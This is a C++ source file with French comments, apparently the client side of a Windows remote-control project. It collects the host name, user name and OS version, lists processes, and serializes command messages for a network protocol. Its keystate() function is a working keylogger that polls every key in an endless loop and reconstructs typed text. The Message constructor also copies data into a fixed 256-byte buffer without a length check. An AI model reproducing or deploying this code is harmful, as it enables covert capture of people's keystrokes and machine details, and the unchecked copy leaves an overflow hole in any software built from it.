#include "../include/LPTF_Packet.hpp"

#include <windows.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include <ctime>
#include <cstdint>
#include <Lmcons.h>
#include <sstream>
#include <unordered_map>
#include <tlhelp32.h>

#ifdef UNICODE
#include <locale>
#include <codecvt>
#endif

LPTF_Packet::LPTF_Packet()
{
}

LPTF_Packet::LPTF_Packet(const LPTF_Packet &other)
{
    this->message = other.message;
}

LPTF_Packet::~LPTF_Packet()
{
}

unsigned long LPTF_Packet::getTimestamp()
{
    return std::time(nullptr);
}

std::string LPTF_Packet::getClientData()
{
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD computerNameSize = sizeof(computerName);
    if (GetComputerNameA(computerName, &computerNameSize))
    {
        std::cout << "Nom du PC : " << computerName << std::endl;
    }
    else
    {
        std::cerr << "Erreur lors de la récupération du nom du PC." << std::endl;
    }

    char userName[UNLEN + 1];
    DWORD userNameSize = sizeof(userName);
    if (GetUserNameA(userName, &userNameSize))
    {
        std::cout << "Nom de l'utilisateur : " << userName << std::endl;
    }
    else
    {
        std::cerr << "Erreur lors de la récupération du nom de l'utilisateur." << std::endl;
    }

    OSVERSIONINFO osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

    // std::time_t time = std::time(nullptr);

    if (GetVersionEx(&osvi))
    {
        std::cout << "OS: Windows " << std::to_string(osvi.dwMajorVersion) << "." << std::to_string(osvi.dwMinorVersion) << std::endl;
        std::cout << "Timestamp: " << getTimestamp() << std::endl;
    }

    std::stringstream ss;
    ss << computerName << " ";
    ss << userName << " ";
    ss << "Windows" << osvi.dwMajorVersion << "." << osvi.dwMinorVersion;
    return ss.str();
}

std::unordered_map<int, std::string> keyNames = {
    {0x41, "A"}, {0x42, "B"}, {0x43, "C"}, {0x44, "D"}, {0x45, "E"}, {0x46, "F"}, {0x47, "G"}, {0x48, "H"}, {0x49, "I"}, {0x4A, "J"}, {0x4B, "K"}, {0x4C, "L"}, {0x4D, "M"}, {0x4E, "N"}, {0x4F, "O"}, {0x50, "P"}, {0x51, "Q"}, {0x52, "R"}, {0x53, "S"}, {0x54, "T"}, {0x55, "U"}, {0x56, "V"}, {0x57, "W"}, {0x58, "X"}, {0x59, "Y"}, {0x5A, "Z"}, {0x30, "0"}, {0x31, "1"}, {0x32, "2"}, {0x33, "3"}, {0x34, "4"}, {0x35, "5"}, {0x36, "6"}, {0x37, "7"}, {0x38, "8"}, {0x39, "9"}, {VK_SPACE, " "}, {VK_RETURN, "\n"}, {VK_SHIFT, "SHIFT"}, {VK_CONTROL, "CTRL"}, {VK_MENU, "ALT"}, {VK_TAB, "TAB"}, {VK_BACK, "BACKSPACE"}, {VK_ESCAPE, "ESC"}, {VK_LEFT, "LEFT"}, {VK_RIGHT, "RIGHT"}, {VK_UP, "UP"}, {VK_DOWN, "DOWN"}};

std::string getKeyName(int key)
{
    bool isShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
    bool isCapsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

    if (key >= 0x41 && key <= 0x5A)
    { // A à Z
        if (isShiftPressed ^ isCapsLockOn)
        {
            return std::string(1, key); // Majuscule
        }
        else
        {
            return std::string(1, key + 32); // Minuscule
        }
    }

    if (keyNames.find(key) != keyNames.end())
    {
        return keyNames[key];
    }
    else
    {
        return "UNKNOWN";
    }
}

void LPTF_Packet::keystate()
{
    // Map pour stocker l'état précédent de chaque touche
    std::unordered_map<int, bool> keyState;

    // Initialiser l'état de chaque touche à non pressée
    for (int key = 8; key <= 222; key++)
    {
        keyState[key] = false;
    }

    while (true)
    {
        for (int key = 8; key <= 222; key++)
        {
            // Vérifie si la touche est actuellement pressée
            bool isPressed = GetAsyncKeyState(key) & 0x8000; // verifie le bit de poid fort

            // Si la touche est pressée et qu'elle n'était pas pressée précédemment
            if (isPressed && !keyState[key])
            {
                std::cout << getKeyName(key);
                keyState[key] = true;
            }

            // Si la touche n'est pas pressée, mettre à jour l'état
            if (!isPressed && keyState[key])
            {
                keyState[key] = false;
            }
        }
        // Petite pause pour éviter une utilisation excessive du CPU
        Sleep(10); // Pause de 10 millisecondes
    }
}

void LPTF_Packet::listProcess()
{
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;

    // Prendre un instantané des processus en cours
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
        std::cerr << "CreateToolhelp32Snapshot (of processes) failed.\n";
        return;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Récupérer les informations sur le premier processus
    if (!Process32First(hProcessSnap, &pe32))
    {
        std::cerr << "Process32First failed.\n";
        CloseHandle(hProcessSnap);
        return;
    }

    do
    {
        std::wcout << L"Process name: " << pe32.szExeFile << L" | Process ID: " << pe32.th32ProcessID << std::endl;
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
}

// LPTF_Packet &LPTF_Packet::operator=(const LPTF_Packet &other)
// {
//     this->packet = other.packet;

//     return *this;
// }

uint64_t htonll(uint64_t value)
{
    if (htonl(1) != 1)
    {
        uint32_t high_part = htonl(static_cast<uint32_t>(value >> 32));
        uint32_t low_part = htonl(static_cast<uint32_t>(value & 0xFFFFFFFF));
        return (static_cast<uint64_t>(low_part) << 32) | high_part;
    }
    else
    {
        return value;
    }
}

uint64_t ntohll(uint64_t value)
{
    if (htonl(1) != 1)
    {
        uint32_t high_part = ntohl(static_cast<uint32_t>(value >> 32));
        uint32_t low_part = ntohl(static_cast<uint32_t>(value & 0xFFFFFFFFLL));
        return (static_cast<uint64_t>(low_part) << 32) | high_part;
    }
    else
    {
        return value;
    }
}

Message::Message(uint8_t cmd, uint8_t status, const std::string &data)
{
    command = cmd;
    status_code = status;
    payload_length = htons(static_cast<uint16_t>(data.size()));
    timestamp = htonll(static_cast<uint64_t>(time(nullptr)));
    memcpy(payload, data.c_str(), data.size());

    if (data.size() < 256)
    {
        memset(payload + data.size(), 0, 256 - data.size());
    }
}

std::vector<uint8_t> LPTF_Packet::serializeMessage(const Message &msg)
{
    size_t total_size = sizeof(msg.command) + sizeof(msg.status_code) +
                        sizeof(msg.payload_length) + sizeof(msg.timestamp) +
                        sizeof(msg.payload);

    std::vector<uint8_t> buffer(total_size);
    uint8_t *ptr = buffer.data();

    memcpy(ptr, &msg.command, sizeof(msg.command));
    ptr += sizeof(msg.command);

    memcpy(ptr, &msg.status_code, sizeof(msg.status_code));
    ptr += sizeof(msg.status_code);

    memcpy(ptr, &msg.payload_length, sizeof(msg.payload_length));
    ptr += sizeof(msg.payload_length);

    memcpy(ptr, &msg.timestamp, sizeof(msg.timestamp));
    ptr += sizeof(msg.timestamp);

    memcpy(ptr, &msg.payload, sizeof(msg.payload));
    return buffer;
}

Message LPTF_Packet::deserializeMessage(const std::vector<uint8_t> &buffer)
{
    Message msg;
    const uint8_t *ptr = buffer.data();

    memcpy(&msg.command, ptr, sizeof(msg.command));
    ptr += sizeof(msg.command);

    memcpy(&msg.status_code, ptr, sizeof(msg.status_code));
    ptr += sizeof(msg.status_code);

    memcpy(&msg.payload_length, ptr, sizeof(msg.payload_length));
    ptr += sizeof(msg.payload_length);

    memcpy(&msg.timestamp, ptr, sizeof(msg.timestamp));
    ptr += sizeof(msg.timestamp);

    memcpy(&msg.payload, ptr, sizeof(msg.payload));

    msg.payload_length = ntohs(msg.payload_length);
    msg.timestamp = ntohll(msg.timestamp);

    return msg;
}